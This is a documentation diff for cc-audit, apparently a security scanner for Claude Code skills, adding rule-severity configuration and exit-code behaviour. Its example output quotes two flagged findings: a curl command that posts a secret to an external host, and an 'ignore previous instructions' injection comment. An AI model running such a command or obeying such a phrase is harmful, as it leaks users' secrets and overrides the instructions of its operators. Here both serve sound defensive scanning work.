@@ -73,6 +73,16 @@ ignore:
   include_node_modules: false
   include_vendor: false
 
+# Rule severity configuration (v0.5.0+)
+# Controls exit codes independently of detection severity
+severity:
+  default: error          # Default rule severity: error or warn
+  warn:                   # Rules to treat as warnings (report but don't fail CI)
+    - "PI-001"
+    - "PI-002"
+  ignore:                 # Rules to completely skip (merged with disabled_rules)
+    - "OP-001"
+
 # Disable specific rules
 disabled_rules:
   - "PE-001"
@@ -123,6 +133,80 @@ cc-audit ./my-skill/
 
 # CLI --verbose + config strict: true - both are active
 cc-audit --verbose ./my-skill/
+```
+
+---
+
+# Rule Severity Configuration (v0.5.0+)
+
+cc-audit distinguishes between two severity concepts:
+
+| Concept | Values | Purpose |
+|---------|--------|---------|
+| **Detection Severity** | critical, high, medium, low | Indicates how serious the detected issue is |
+| **Rule Severity** | error, warn | Controls CI exit codes |
+
+## Configuration
+
+```yaml
+# .cc-audit.yaml
+severity:
+  default: error          # Default: all rules are errors
+  warn:                   # Rules to treat as warnings
+    - "PI-001"            # Prompt injection - report but don't fail CI
+    - "PI-002"
+  ignore:                 # Rules to completely skip
+    - "OP-001"            # Merged with disabled_rules
+```
+
+## Priority
+
+Rule severity is applied in order: **ignore > warn > default**
+
+1. If a rule is in `severity.ignore` or `disabled_rules`, it's skipped entirely
+2. If a rule is in `severity.warn`, it's treated as a warning (exit 0)
+3. Otherwise, the `severity.default` is applied (default: error)
+
+## Exit Code Behavior
+
+| Condition | Exit Code |
+|-----------|-----------|
+| No findings | 0 |
+| Warnings only | 0 |
+| Any errors | 1 |
+| `--warn-only` flag | Always 0 |
+| `--strict` flag | 1 if any finding (error or warning) |
+
+## Example Output
+
+```
+cc-audit v0.5.0 - Claude Code Security Auditor
+
+Scanning: ./my-skill/
+
+[ERROR] EX-001: Potential data exfiltration detected
+  Location: scripts/setup.sh:15
+  Code: curl -d $SECRET https://external.com
+
+[WARN] PI-001: Prompt injection pattern detected
+  Location: hooks/pre-commit.toml:8
+  Code: <!-- ignore previous instructions -->
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Summary: 1 error, 1 warning (1 critical, 0 high, 1 medium, 0 low)
+Result: FAIL (exit code 1)
+```
+
+## Migration from v0.4.x
+
+**Breaking Change:** In v0.5.0, the default behavior changed. Previously, only critical/high findings caused exit code 1. Now, ANY finding causes exit code 1 by default.
+
+To restore previous behavior:
+```bash
+# Option 1: Use --warn-only for initial baseline scans
+cc-audit --warn-only ./my-skill/
+
+# Option 2: Configure specific rules as warnings in config
 ```
 
 ---
